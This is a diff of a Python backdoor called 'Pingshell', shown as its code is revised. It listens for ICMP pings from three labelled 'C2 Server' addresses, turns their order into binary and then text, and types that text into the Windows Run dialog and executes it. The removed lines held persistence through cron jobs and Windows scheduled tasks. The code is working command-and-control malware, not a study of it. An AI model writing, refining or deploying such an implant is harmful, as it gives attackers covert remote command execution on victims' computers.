@@ -1,190 +1,112 @@
-import socket
-import io
-import os
 import time
 import platform
-import subprocess
-from datetime import datetime, timedelta
-from crontab import CronTab
+from scapy.all import sniff, IP, ICMP, get_if_addr
 from pynput.keyboard import Controller, Key
 
+# Get host's own IP to avoid self-detection
+host_ip = get_if_addr("Ethernet")  # Change "Ethernet" to correct interface if needed
+
+# C2 Server IPs
+addr1 = "420.69.96.421"
+addr2 = "420.69.96.422"
+addr3 = "420.69.96.423"
+
+# Store incoming binary data in memory instead of a file
+binary_buffer = ""
+
+# Global keyboard controller
+keyboard = Controller()
+
 def press_windows_r():
-    keyboard = Controller()
+    """ Simulates pressing Windows+R and waits for the Run dialog to appear """
     keyboard.press(Key.cmd)
     keyboard.press('r')
     keyboard.release('r')
     keyboard.release(Key.cmd)
-
-def read_binary_from_file(file_path):
-    try:
-        with open(file_path, "r") as file:
-            binary_str = file.read().replace(" ", "").strip()
-            return binary_str
-    except FileNotFoundError:
-        return None
+    time.sleep(2)  # Increased delay to ensure Run dialog is open
 
 def binary_to_text(binary_str):
+    """ Converts a binary string to text, ensuring only full bytes are processed """
+    if len(binary_str) % 8 != 0:
+        print(f"[!] Warning: Incomplete byte detected! Binary length: {len(binary_str)}")
+        binary_str = binary_str[:-(len(binary_str) % 8)]  # Trim off incomplete bits
+    
     try:
         chunks = [binary_str[i:i+8] for i in range(0, len(binary_str), 8)]
         text = "".join(chr(int(chunk, 2)) for chunk in chunks)
         return text
-    except ValueError:
+    except ValueError as e:
+        print(f"[!] Error in binary conversion: {e}")
         return None
 
 def type_text(text):
-    keyboard = Controller()
-    keyboard.type(text)
+    """ Types the given text into the active window """
+    for char in text:
+        keyboard.press(char)
+        keyboard.release(char)
+        time.sleep(0.05)  # Slight delay for more reliable input
 
-def exectute_payload():
-    keyboard = Controller()
+def execute_payload():
+    """ Simulates pressing Enter and Left Arrow to execute the command """
+    #keyboard.press(Key.ctrl)
+    #keyboard.press(Key.shift)
     keyboard.press(Key.enter)
     keyboard.release(Key.enter)
-    keyboard.press(Key.left)
-    keyboard.release(Key.left)
+    #keyboard.release(Key.ctrl)
+    #keyboard.release(Key.shift)
+    #keyboard.press(Key.left)
+    #keyboard.release(Key.left)
+    time.sleep(0.5)
     keyboard.press(Key.enter)
     keyboard.release(Key.enter)
 
-def create_cron_job(python_file_path, interval=None, run_once=False):
-    python_file_path = os.path.abspath(python_file_path)
-    python_interpreter = os.path.abspath('python')
+def icmp_handler(pkt):
+    """ Processes incoming ICMP Echo Requests and handles data """
+    global binary_buffer
 
-    system = platform.system()
-    
-    if system == 'Linux':
-        cron = CronTab(user=True)
-        if run_once:
-            run_time = datetime.now() + timedelta(minutes=1)
-            minute = run_time.minute
-            hour = run_time.hour
-            day = run_time.day
-            month = run_time.month
-            job = cron.new(command=f'{python_interpreter} {python_file_path}', comment='One-time Python script')
-            job.setall(f'{minute} {hour} {day} {month} *')
+    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # Type 8 = Echo Request
+        src_ip = pkt[IP].src
+
+        if src_ip == host_ip:
+            return  # Ignore self-pings
+
+        print(f"[*] ICMP Echo Request received from {src_ip}")
+
+        if src_ip == addr1:
+            print("# Packet matches addr1")
+            binary_buffer += "0"
+            print(f"Current binary_buffer: {binary_buffer}")
+
+        elif src_ip == addr2:
+            print("# Packet matches addr2")
+            binary_buffer += "1"
+            print(f"Current binary_buffer: {binary_buffer}")
+
+        elif src_ip == addr3:
+            print("# Packet matches addr3 (Processing binary data)")
+
+            if binary_buffer:
+                print(f"[DEBUG] Final Binary Buffer Before Conversion: {binary_buffer} (Length: {len(binary_buffer)})")
+                plaintext = binary_to_text(binary_buffer)
+                if plaintext:
+                    press_windows_r()
+                    time.sleep(1)  # Ensure Run dialog is active
+                    type_text(plaintext)
+                    time.sleep(1)
+                    print(plaintext)
+                    time.sleep(0.5)
+                    execute_payload()
+                    binary_buffer = ""  # Clear buffer after execution
+                else:
+                    print("Invalid binary input")
+            else:
+                print("Binary buffer is empty")
         else:
-            job = cron.new(command=f'{python_interpreter} {python_file_path}', comment='Recurring Python script')
-            job.setall(interval or '* * * * *')
-        
-        cron.write()
-        print(f"Cron job created on Linux to run {python_file_path} {'one time' if run_once else 'at interval ' + (interval if interval else '* * * * *')}")
-    
-    elif system == 'Windows':
-        task_name = 'MyPythonScript'
-        if run_once:
-            run_time = datetime.now() + timedelta(minutes=1)
-            start_time = run_time.strftime('%H:%M')
-            start_date = run_time.strftime('%m/%d/%Y')
-            
-            command = f'schtasks /create /tn {task_name} /tr "{python_interpreter} {python_file_path}" /sc once /st {start_time} /sd {start_date} /f'
-        else:
-            trigger_type = 'DAILY'
-            if interval == '* * * * *':
-                trigger_type = 'MINUTE'
-            elif interval == '0 0 * * *':
-                trigger_type is 'DAILY'
-            
-            command = f'schtasks /create /tn {task_name} /tr "{python_interpreter} {python_file_path}" /sc {trigger_type} /f'
-        
-        try:
-            subprocess.run(command, check=True, shell=True)
-            print(f"Scheduled task created on Windows to run {python_file_path} {'one time' if run_once else 'with trigger ' + trigger_type}")
-        except subprocess.CalledProcessError as e:
-            print(f"Failed to create scheduled task on Windows: {e}")
-    else:
-        raise OSError("Unsupported operating system")
+            print(f"[!] Unexpected ICMP packet from {src_ip}")
 
 def main():
-    addr1 = "420.69.96.421"
-    addr2 = "420.69.96.422"
-    addr3 = "420.69.96.423"
-    file_path = "config.txt"
+    print("[*] Pingshell is now listening for ICMP Echo Requests...")
+    sniff(filter="icmp", prn=icmp_handler, store=False)  # Consider adding iface="Ethernet" or "wlan0"
 
-    with io.open(file_path, 'w', encoding='utf-8') as file:
-        file.write("config placeholder")
-
-    #create_cron_job("./pingshell_encode_decode.py", run_once=True)
-
-    try:
-        if platform.system() == 'Windows':
-            # On Windows, create a raw socket using IPPROTO_ICMP instead of IPPROTO_IP
-            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
-                s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
-                print("Raw socket created successfully.")
-                while True:
-                    try:
-                        packet, addr = s.recvfrom(1024)
-                        print(f"Received packet from {addr[0]}")
-                        if addr[0] == addr1:
-                            print("do stuff here")
-                            with open("incoming.txt", "a") as file:
-                                file.write("0")
-                        elif addr[0] == addr2:
-                            print("other stuff here")
-                            with open("incoming.txt", "a") as file:
-                                file.write("1")
-                        elif addr[0] == addr3:
-                            print("received ping from 3rd address")
-                            file_path = "incoming.txt"
-                            binary_str = read_binary_from_file(file_path)
-
-                            if binary_str:
-                                plaintext = binary_to_text(binary_str)
-                                if plaintext:
-                                    press_windows_r()
-                                    time.sleep(1)
-                                    type_text(plaintext)
-                                    open('incoming.txt', 'w').close()
-                                    exectute_payload()
-
-                                else:
-                                    print("Invalid binary input")
-                            else:
-                                print(f"File '{file_path}' not found")
-                        else:
-                            print("unexpected ping address")
-                            time.sleep(1)
-                    except socket.error as recv_err:
-                        print(f"Error receiving data: {recv_err}")
-                        time.sleep(1)
-        else:
-            with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
-                print("Raw socket created successfully.")
-                while True:
-                    try:
-                        packet, addr = s.recvfrom(1024)
-                        print(f"Received ping from {addr[0]}")
-                        if addr[0] == addr1:
-                            print("do stuff here")
-                            with open("incoming.txt", "a") as file:
-                                file.write("0")
-                        elif addr[0] == addr2:
-                            print("other stuff here")
-                            with open("incoming.txt", "a") as file:
-                                file.write("1")
-                        elif addr[0] == addr3:
-                            print("received ping from 3rd address")
-                            file_path = "incoming.txt"
-                            binary_str = read_binary_from_file(file_path)
-
-                            if binary_str:
-                                plaintext = binary_to_text(binary_str)
-                                if plaintext:
-                                    press_windows_r()
-                                    time.sleep(1)
-                                    type_text(plaintext)
-                                    exectute_payload()
-                                else:
-                                    print("Invalid binary input")
-                            else:
-                                print(f"File '{file_path}' not found")
-                        else:
-                            print("unexpected ping address")
-                            time.sleep(1)
-                    except socket.error as recv_err:
-                        print(f"Error receiving data: {recv_err}")
-                        time.sleep(1)
-    except socket.error as sock_err:
-        print(f"Socket creation failed: {sock_err}. Ensure you are running the script with appropriate privileges.")
-
-if __name__ == "__main__":
-    main()#remove this after testing to allow cron jobs to run
-
+#if __name__ == "__main__":
+#    main()
